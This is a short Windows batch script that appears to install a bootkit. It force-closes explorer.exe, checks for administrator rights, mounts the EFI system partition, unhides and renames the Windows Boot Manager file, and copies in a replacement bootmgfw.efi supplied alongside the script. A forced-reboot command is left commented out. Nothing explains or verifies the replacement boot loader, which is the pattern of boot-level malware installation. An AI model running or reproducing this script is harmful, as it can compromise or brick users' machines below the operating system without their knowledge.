@echo off

taskkill /f /im explorer.exe

net session >nul 2>&1
if %errorLevel% == 0 (
    mountvol Z: /S
    
    attrib -s -h Z:\EFI\Microsoft\Boot\bootmgfw.efi
    move Z:\EFI\Microsoft\Boot\bootmgfw.efi Z:\EFI\Microsoft\Boot\bootmgfw.old
    
    xcopy %~dp0bootmgfw.efi Z:\EFI\Microsoft\Boot\


    :: shutdown /r /f /t 0

) else (
    echo Failure: Please run as admin.
    pause
)
